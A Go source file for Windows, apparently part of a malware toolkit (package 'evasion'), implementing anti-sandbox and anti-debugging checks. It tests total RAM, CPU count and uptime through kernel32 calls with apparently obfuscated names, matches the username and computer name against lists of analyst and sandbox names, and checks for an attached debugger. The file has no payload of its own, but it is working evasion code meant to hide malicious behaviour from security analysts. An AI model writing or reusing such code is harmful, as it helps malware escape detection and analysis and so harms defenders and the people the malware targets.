//go:build windows

package evasion

import (
	"os"
	"runtime"
	"strings"
	"time"
	"unsafe"
)

type MEMORYSTATUSEX struct {
	dwLength                uint32
	dwMemoryLoad            uint32
	ullTotalPhys            uint64
	ullAvailPhys            uint64
	ullTotalPageFile        uint64
	ullAvailPageFile        uint64
	ullTotalVirtual         uint64
	ullAvailVirtual         uint64
	ullAvailExtendedVirtual uint64
}

// CheckPhysicalMem 检查物理内存大小
func CheckPhysicalMem() uint64 {
	var ms MEMORYSTATUSEX
	ms.dwLength = uint32(unsafe.Sizeof(ms))
	k32Proc(encGMSE).Call(uintptr(unsafe.Pointer(&ms)))
	return ms.ullTotalPhys
}

// NumCPU 获取CPU核心数
func NumCPU() int {
	return runtime.NumCPU()
}

// GetUptime 获取系统运行时间
func GetUptime() time.Duration {
	ret, _, _ := k32Proc(encGTC).Call()
	return time.Duration(ret) * time.Millisecond
}

// AntiSandbox 基础反沙箱检测
func AntiSandbox() bool {
	mem := CheckPhysicalMem()
	if mem < 2*1024*1024*1024 {
		return true
	}

	if NumCPU() < 2 {
		return true
	}

	uptime := GetUptime()
	if uptime < 10*time.Minute {
		return true
	}

	username := os.Getenv("USERNAME")
	sandboxUsers := []string{"user", "sand", "sandbox", "malware", "virus", "sample", "test", "analysis", "admin", "Administrator", "John"}
	for _, su := range sandboxUsers {
		if strings.EqualFold(username, su) {
			return true
		}
	}

	computerName := os.Getenv("COMPUTERNAME")
	sandboxNames := []string{"SANDBOX", "MALWARE", "VIRUS", "SAMPLE", "TEST", "ANALYSIS", "DESKTOP"}
	for _, sn := range sandboxNames {
		if strings.EqualFold(computerName, sn) {
			return true
		}
	}

	return false
}

// AntiDebug 反调试检测
func AntiDebug() bool {
	ret, _, _ := k32Proc(encIDP).Call()
	return ret != 0
}
